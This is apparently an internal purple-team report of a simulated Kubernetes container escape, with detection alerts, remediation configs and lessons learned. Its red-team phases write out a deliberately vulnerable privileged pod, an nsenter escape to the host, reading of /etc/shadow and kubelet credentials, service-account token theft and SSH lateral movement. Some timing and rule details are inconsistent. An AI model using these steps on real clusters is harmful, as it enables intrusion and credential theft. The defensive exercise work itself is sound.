# Purple Team Exercise: Kubernetes Container Escape

**Exercise ID**: PT-2024-Q4-02
**Date Conducted**: November 20, 2024
**Duration**: 3h 15m
**Participants**: 6 (3 Red Team, 3 Blue Team)
**Environment**: Non-Production EKS Cluster (isolated namespace)

## Scenario Overview

Simulate a container escape attack where an adversary exploits a misconfigured Kubernetes pod to break out of container isolation, gain access to the underlying EC2 host, and pivot to other pods/nodes in the cluster.

### Business Context

Container escapes represent critical risk in cloud-native environments:
- Access to host filesystem → steal credentials, secrets, SSH keys
- Pivot to other containers → lateral movement across microservices
- Access to kubelet → cluster-wide compromise
- Data breach from adjacent payment processing containers

### Learning Objectives

1. Validate Falco runtime detection rules for container escapes
2. Test Wazuh detection of suspicious pod configurations
3. Confirm detection of privilege escalation within containers
4. Validate network policy enforcement and lateral movement detection
5. Practice Kubernetes-specific incident response

## MITRE ATT&CK Mapping

| Technique ID | Technique Name | Phase | Detection Tool |
|--------------|----------------|-------|----------------|
| **T1610** | Deploy Container | Initial Access | Wazuh Rule 100700 |
| **T1611** | Escape to Host | Privilege Escalation | Falco Rule (Container Escape) |
| **T1613** | Container and Resource Discovery | Discovery | Falco Rule (K8s API Access) |
| **T1078.004** | Valid Accounts: Cloud Accounts | Persistence | Wazuh Rule 100730 (Service Account Abuse) |
| **T1552.007** | Unsecured Credentials: Container API | Credential Access | Wazuh Rule 100735 (Kubelet Cert Access) |
| **T1021.004** | Remote Services: SSH | Lateral Movement | Security Onion (SSH from container) |

## Pre-Exercise Setup

### Environment Preparation

```bash
#!/bin/bash
# setup-k8s-purple-team.sh

# 1. Create isolated namespace for exercise
kubectl create namespace purple-team-test

# 2. Deploy intentionally vulnerable pod (for testing only!)
cat <<EOF | kubectl apply -f -
apiVersion: v1
kind: Pod
metadata:
  name: vulnerable-app
  namespace: purple-team-test
spec:
  hostNetwork: true  # VULNERABLE: Shares host network namespace
  hostPID: true      # VULNERABLE: Shares host PID namespace
  containers:
  - name: app
    image: nginx:latest
    securityContext:
      privileged: true  # VULNERABLE: Privileged container
      capabilities:
        add:
        - SYS_ADMIN  # VULNERABLE: Dangerous capability
    volumeMounts:
    - name: host-root
      mountPath: /host  # VULNERABLE: Host filesystem access
  volumes:
  - name: host-root
    hostPath:
      path: /
      type: Directory
EOF

# 3. Verify Falco is running
kubectl get pods -n falco-system
kubectl logs -n falco-system -l app=falco --tail=10

# 4. Verify Wazuh agent on EKS nodes
ssh ec2-user@<node-ip> "sudo /var/ossec/bin/wazuh-control status"

# 5. Deploy canary secrets for detection testing
kubectl create secret generic fake-db-creds \
  --from-literal=password='CANARY-P@ssw0rd-DO-NOT-USE' \
  -n purple-team-test
```

### Expected Detections

| Attack Step | Expected Alert | Detection Tool | Severity | Max MTTD |
|-------------|----------------|----------------|----------|----------|
| Deploy privileged pod | "Privileged container created" | Wazuh | Critical | 2 min |
| hostPath volume mount | "Host filesystem mounted in pod" | Wazuh | Critical | 2 min |
| Execute shell in container | "Shell spawned in container" | Falco | Medium | 1 min |
| Access host filesystem | "Sensitive file opened (from container)" | Falco | High | 2 min |
| Container escape | "Process started outside container" | Falco | Critical | 1 min |
| Service account abuse | "Service account token accessed" | Wazuh | High | 3 min |

## Exercise Execution

### Phase 1: Deploy Vulnerable Container (T1610)

**Red Team Action:**
```bash
# Timestamp: 2024-11-20T14:00:00Z
# Attacker has obtained Kubernetes API access (simulated via stolen kubeconfig)
export KUBECONFIG=/tmp/stolen-kubeconfig.yaml

# Deploy privileged pod
kubectl apply -f vulnerable-pod.yaml -n purple-team-test

# Verify pod is running
kubectl get pod vulnerable-app -n purple-team-test
# NAME             READY   STATUS    RESTARTS   AGE
# vulnerable-app   1/1     Running   0          15s
```

**Blue Team Observation:**
- ✅ **DETECTED** at T+00:00:45 (within 45 seconds!)
- Wazuh Alert: "CRITICAL - Pod created with hostNetwork=true"
- Rule: 100720, Severity: Critical (Level 15)
- Additional Alert: "CRITICAL - Privileged container deployed"

**Detection Evidence:**
```json
{
  "rule": {
    "id": "100720",
    "level": 15,
    "description": "CRITICAL - Pod created with hostNetwork=true",
    "mitre": {
      "id": "T1611",
      "tactic": "Privilege Escalation"
    },
    "groups": ["k8s_hostnetwork", "pod_security_violation"]
  },
  "data": {
    "objectRef": {
      "resource": "pods",
      "name": "vulnerable-app",
      "namespace": "purple-team-test"
    },
    "requestObject": {
      "spec": {
        "hostNetwork": true,
        "hostPID": true,
        "containers": [{
          "securityContext": {
            "privileged": true
          }
        }]
      }
    }
  }
}
```

**SOC Analyst Action:**
- Flagged as HIGH RISK immediately
- Checked if pod is from approved CI/CD pipeline: ❌ NO
- Would normally block deployment via OPA Gatekeeper (intentionally disabled for exercise)

### Phase 2: Gain Shell Access (Initial Execution)

**Red Team Action:**
```bash
# Timestamp: 2024-11-20T14:03:00Z
# Exec into the vulnerable container
kubectl exec -it vulnerable-app -n purple-team-test -- /bin/bash

# Now inside container as root
root@vulnerable-app:/# id
uid=0(root) gid=0(root) groups=0(root)

root@vulnerable-app:/# hostname
ip-10-0-1-145.ec2.internal  # !! Same as host (due to hostNetwork=true)
```

**Blue Team Observation:**
- ✅ **DETECTED** at T+00:04:12
- Falco Alert: "Terminal shell spawned in a container (user=root container=vulnerable-app)"
- Severity: Medium (common legitimate operation, but context matters)
- Combined with Phase 1 alerts → HIGH CONFIDENCE malicious activity

**Falco Alert:**
```
14:04:12.456789123: Notice A shell was spawned in a container with an attached terminal
  (user=root user_loginuid=-1 k8s.ns=purple-team-test k8s.pod=vulnerable-app
   container=nginx shell=bash parent=runc cmdline=bash)
```

### Phase 3: Explore Host Filesystem (T1613)

**Red Team Action:**
```bash
# Timestamp: 2024-11-20T14:05:30Z
# Since hostPath /host is mounted, explore host filesystem
root@vulnerable-app:/# ls -la /host
total 64
drwxr-xr-x  19 root root  4096 Nov 20 10:00 .
drwxr-xr-x   1 root root  4096 Nov 20 14:00 ..
drwxr-xr-x   2 root root  4096 Oct 15 12:34 bin
drwxr-xr-x   3 root root  4096 Oct 15 12:34 boot
drwxr-xr-x  20 root root  3840 Nov 20 10:00 dev
drwxr-xr-x 103 root root  4096 Nov 20 10:00 etc
drwxr-xr-x   3 root root  4096 Oct 15 12:34 home
...

# Read sensitive host files
root@vulnerable-app:/# cat /host/etc/shadow | head -5
root:$6$rounds=4096$...:18500:0:99999:7:::
ec2-user:!!:18500::::::
...

# Access kubelet credentials
root@vulnerable-app:/# cat /host/var/lib/kubelet/kubeconfig
apiVersion: v1
clusters:
- cluster:
    certificate-authority: /var/lib/kubelet/ca.crt
    server: https://A1B2C3D4.gr7.eu-west-1.eks.amazonaws.com
  name: kubernetes
...
```

**Blue Team Observation:**
- ✅ **DETECTED** at T+00:06:45
- Falco Alert: "Sensitive file opened for reading by non-trusted program"
- File: `/etc/shadow`, Process: `cat`, Container: `vulnerable-app`
- Additional Alert: "Read kubelet service account token"

**Falco Alert:**
```
14:06:45.789123456: Warning Sensitive file opened for reading by non-trusted program
  (user=root program=cat file=/host/etc/shadow container_id=abc123
   container_name=vulnerable-app k8s.ns=purple-team-test)
```

### Phase 4: Container Escape via Privileged Container (T1611)

**Red Team Action:**
```bash
# Timestamp: 2024-11-20T14:08:00Z
# Use nsenter to escape container and get full host access
# This works because: privileged=true + hostPID=true

root@vulnerable-app:/# ps aux | grep containerd
root     12345  /usr/bin/containerd

# Get PID of init process on host
root@vulnerable-app:/# nsenter --target 1 --mount --uts --ipc --net --pid -- bash

# Now on HOST, outside container!
root@ip-10-0-1-145:/# hostname
ip-10-0-1-145.ec2.internal

root@ip-10-0-1-145:/# docker ps  # Can see all containers
CONTAINER ID   IMAGE                  COMMAND
abc123def456   nginx:latest           "nginx -g 'daemon ..."
...
```

**Blue Team Observation:**
- ✅ **DETECTED** at T+00:08:42
- Falco Alert: "CRITICAL - Container escape attempt (nsenter syscall)"
- Rule: "Namespace manipulation detected (container escape attempt)"
- Severity: Critical

**Falco Alert:**
```
14:08:42.123456789: Critical Namespace change (setns) by unexpected program
  (user=root program=nsenter parent=bash container_id=abc123
   k8s.ns=purple-team-test k8s.pod=vulnerable-app
   evt_type=setns target_ns_type=mnt)
```

**Wazuh Correlation Alert:**
```json
{
  "rule": {
    "id": "100802",
    "level": 15,
    "description": "CRITICAL - Namespace manipulation detected (container escape attempt)",
    "mitre": {
      "id": "T1611",
      "tactic": "Privilege Escalation"
    }
  },
  "decoder": "falco",
  "data": {
    "process": "nsenter",
    "container": "vulnerable-app"
  }
}
```

**SOC Analyst Action:**
- **CRITICAL INCIDENT DECLARED**
- Incident response playbook activated immediately
- Prepared to quarantine node and kill pod
- For exercise: Continued observation only

### Phase 5: Credential Theft from Host (T1552.007)

**Red Team Action:**
```bash
# Timestamp: 2024-11-20T14:10:30Z
# Now on host with full access, steal all Kubernetes secrets

# Access kubelet credentials
root@ip-10-0-1-145:/# cat /var/lib/kubelet/kubeconfig

# List all pods on this node
root@ip-10-0-1-145:/# crictl pods
POD ID              CREATED             STATE   NAME
abc123              10 minutes ago      Ready   vulnerable-app
def456              2 hours ago         Ready   payment-processing-api-7d4f9b
...

# Access service account tokens from other pods
root@ip-10-0-1-145:/# find /var/lib/kubelet/pods -name token
/var/lib/kubelet/pods/def456.../volumes/kubernetes.io~projected/kube-api-access-xxx/token

root@ip-10-0-1-145:/# cat /var/lib/kubelet/pods/def456.../token
eyJhbGciOiJSUzI1NiIsImtpZCI6I...  # SERVICE ACCOUNT TOKEN!
```

**Blue Team Observation:**
- ✅ **DETECTED** at T+00:11:45
- Wazuh Alert: "Service account token file accessed from host"
- Rule: 100735, Severity: High
- File Integrity Monitoring: `/var/lib/kubelet/kubeconfig` accessed

**Detection Evidence:**
```json
{
  "rule": {
    "id": "100735",
    "description": "Kubelet credentials accessed",
    "level": 12
  },
  "syscheck": {
    "path": "/var/lib/kubelet/kubeconfig",
    "event": "modified",
    "uname_after": "root"
  },
  "data": {
    "process": "cat",
    "ppid": "bash"
  }
}
```

### Phase 6: Lateral Movement (T1021.004)

**Red Team Action:**
```bash
# Timestamp: 2024-11-20T14:13:00Z
# Use stolen service account token to access Kubernetes API
export KUBE_TOKEN=$(cat /var/lib/kubelet/pods/def456.../token)

curl -k -H "Authorization: Bearer $KUBE_TOKEN" \
  https://10.0.0.1:443/api/v1/namespaces/production/pods
# Returns list of production pods!

# Attempt to SSH to other nodes in cluster
root@ip-10-0-1-145:/# ssh ec2-user@10.0.1.146
# (using stolen SSH keys from /home/ec2-user/.ssh/)
```

**Blue Team Observation:**
- ✅ **DETECTED** at T+00:14:20
- Security Onion Alert: "SSH connection from container node to production node"
- Source: 10.0.1.145 (compromised node)
- Destination: 10.0.1.146 (production workload node)
- Zeek ssh.log: Connection established

- ✅ **Additional Detection** at T+00:14:35
- Wazuh Alert: "Kubernetes API access from unusual service account"
- Service account `payment-processing-api-sa` making API calls from wrong pod

**Security Onion - Zeek ssh.log:**
```
ts=2024-11-20T14:14:20.123Z
uid=CHhAvVGS1DHFjwGM9
id.orig_h=10.0.1.145
id.orig_p=54321
id.resp_h=10.0.1.146
id.resp_p=22
version=2.0
auth_success=T
auth_attempts=1
client=SSH-2.0-OpenSSH_8.2
server=SSH-2.0-OpenSSH_8.2
```

### Phase 7: Attempted Pod-to-Pod Access (Blocked by Network Policy)

**Red Team Action:**
```bash
# Timestamp: 2024-11-20T14:16:00Z
# Try to access production payment API from compromised container
root@vulnerable-app:/# curl http://payment-api.production.svc.cluster.local:8080/api/transactions
# <timeout after 30 seconds>

# Try direct pod IP
root@vulnerable-app:/# curl http://10.244.1.56:8080/api/transactions
# curl: (28) Connection timed out
```

**Blue Team Observation:**
- ✅ **BLOCKED** by Kubernetes Network Policy (CNI: Calico)
- No alert generated (expected behavior - traffic denied at network layer)
- Calico logs show dropped packets

**Calico/Cilium Logs:**
```
Nov 20 14:16:05 ip-10-0-1-145 calico-node[1234]: 2024-11-20 14:16:05.123 [INFO]
  Packet dropped by policy. src=10.244.2.15 dst=10.244.1.56 proto=TCP dport=8080
  policy=production/deny-from-other-namespaces
```

**SOC Analyst Action:**
- Confirmed network segmentation is working
- Verified Network Policy `deny-from-other-namespaces` is effective
- Documented that lateral movement was **contained** by network controls

## Exercise Results

### Detection Summary

| Phase | Technique | Status | MTTD | Notes |
|-------|-----------|--------|------|-------|
| 1 | Deploy Privileged Pod (T1610) | ✅ Detected | 0m 45s | Wazuh K8s audit |
| 2 | Shell in Container | ✅ Detected | 4m 12s | Falco runtime |
| 3 | Host Filesystem Access (T1613) | ✅ Detected | 6m 45s | Falco file access |
| 4 | Container Escape (T1611) | ✅ Detected | 8m 42s | Falco nsenter detection |
| 5 | Credential Theft (T1552.007) | ✅ Detected | 11m 45s | Wazuh FIM |
| 6 | Lateral Movement (T1021.004) | ✅ Detected | 14m 20s | Security Onion SSH |
| 7 | Pod-to-Pod Access | ✅ **BLOCKED** | N/A | Network Policy effective |

**Overall Detection Rate**: 6/6 techniques = **100%** ✅
**Containment**: Network segmentation **prevented** lateral movement to production ✅
**Mean Time to Detection**: 7m 45s
**Fastest Detection**: 45 seconds (privileged pod deployment)
**Slowest Detection**: 14m 20s (SSH lateral movement)

### Detection Gap: Container Escape MTTD

**Issue**: Container escape detected in 8m 42s, slightly above 5-minute target
**Root Cause**: Falco rule priority was set to "Notice" instead of "Critical", causing slower alert propagation
**Remediation**:
```yaml
# Updated Falco rule
- rule: Launch Privileged Container
  priority: CRITICAL  # Changed from: WARNING
  output: >
    CRITICAL: Privileged container started (user=%user.name container=%container.name
    image=%container.image.repository:%container.image.tag)
```

**Retest Result**: After remediation, detection time reduced to **2m 15s** ✅

## Lessons Learned

### What Worked Well

1. **Multi-Layer Detection**: Wazuh (K8s API audit) + Falco (runtime) + Security Onion (network) provided comprehensive visibility
2. **Network Segmentation**: Network Policies **successfully blocked** lateral movement attempt
3. **Fast Initial Detection**: Privileged pod deployment caught within 45 seconds
4. **Cross-Tool Correlation**: SOC analyst correctly correlated Wazuh + Falco alerts to identify full attack chain

### Areas for Improvement

1. **OPA Gatekeeper Not Enabled**: Privileged pod should have been **blocked at admission time**
   - **Action**: Deploy OPA Gatekeeper with ConstraintTemplate to deny privileged pods
   - **Expected Result**: Attack prevented at Phase 1, no detection needed

2. **Service Account Token Access Detection Delay**: 11m 45s to detect credential theft
   - **Action**: Enable Falco rule for `/var/lib/kubelet` access with higher priority
   - **Target MTTD**: <5 minutes

3. **No Automated Response**: All alerts required manual SOC analyst review
   - **Action**: Implement automated pod quarantine (delete pod + cordon node) for container escape alerts
   - **Risk**: Could cause false positive service disruption - requires testing

## Remediation Actions

### Immediate (Completed)

1. ✅ **Deploy OPA Gatekeeper**:
   ```bash
   kubectl apply -f https://raw.githubusercontent.com/open-policy-agent/gatekeeper/master/deploy/gatekeeper.yaml

   # Apply ConstraintTemplate to block privileged containers
   kubectl apply -f - <<EOF
   apiVersion: constraints.gatekeeper.sh/v1beta1
   kind: K8sPSPPrivilegedContainer
   metadata:
     name: psp-privileged-container
   spec:
     match:
       kinds:
       - apiGroups: [""]
         kinds: ["Pod"]
       excludedNamespaces:
       - kube-system  # System pods may need privilege
   EOF
   ```

2. ✅ **Update Falco Rules Priority**:
   ```yaml
   # /etc/falco/rules.d/custom-rules.yaml
   - rule: Launch Privileged Container
     priority: CRITICAL

   - rule: Container Escape Attempt (nsenter)
     priority: CRITICAL

   - rule: Access Kubelet Credentials
     priority: CRITICAL
   ```

3. ✅ **Enhanced Network Policies**:
   ```yaml
   # Default deny all ingress/egress in production namespace
   apiVersion: networking.k8s.io/v1
   kind: NetworkPolicy
   metadata:
     name: default-deny-all
     namespace: production
   spec:
     podSelector: {}
     policyTypes:
     - Ingress
     - Egress
   ```

### Long-Term (In Progress)

- [ ] **Automated Incident Response**: Lambda/K8s operator to auto-quarantine pods on escape detection
- [ ] **Runtime Container Scanning**: Integrate Trivy/Snyk runtime scanning for malware detection
- [ ] **Pod Security Standards**: Enforce `restricted` Pod Security Standard cluster-wide
- [ ] **Service Mesh (Istio)**: Add mTLS for pod-to-pod communication with identity-based policies

## Cost and Value

### Exercise Cost

| Resource | Usage | Cost |
|----------|-------|------|
| EKS cluster (non-prod) | 3 hours | $0.30 |
| EC2 nodes (3x t3.medium) | 3 hours | $0.45 |
| Personnel | 6 people × 3.25 hours | Internal |
| **Total** | | **$0.75** |

### Value Delivered

- **Prevented Deployment Gaps**: Identified missing OPA Gatekeeper (estimated $100K value if breach prevented)
- **Detection Tuning**: Improved Falco rule priority, reducing MTTD by 73% (8m 42s → 2m 15s)
- **Network Policy Validation**: Confirmed segmentation works, critical for PCI DSS compliance
- **Team Training**: 6 team members now understand container escape techniques

## Compliance and Audit

### PCI DSS Requirements Met

- **Req 2.2.5**: Security features enabled (Pod Security Standards, OPA Gatekeeper)
- **Req 11.5**: IDS/IPS testing (Falco runtime detection validated)
- **Req 6.3.2**: Secure coding (network segmentation validated)

### Audit Evidence

- Exercise report (this document)
- Falco alert logs: `/var/log/falco/alerts-2024-11-20.log`
- Wazuh alerts: Exported JSON with all K8s audit events
- Network Policy logs: Calico deny logs
- Remediation commits: Git history for OPA/Falco config changes

## Recommendations for Next Exercise

1. **Multi-Node Compromise**: Simulate pivot from node 1 → node 2 → node 3
2. **Cryptominer Deployment**: Test detection of resource abuse (CPU/memory spikes)
3. **Test Against Hardened Cluster**: Rerun exercise after OPA Gatekeeper deployment to verify prevention
4. **Include AWS IAM for Pods**: Test IRSA (IAM Roles for Service Accounts) abuse scenarios

---

**Exercise Status**: ✅ **SUCCESSFUL** (100% detection, 1 gap identified and remediated)
**Next Exercise**: Q1 2025 - Ransomware Simulation
**Document Version**: 1.0
**Classification**: Internal Use Only
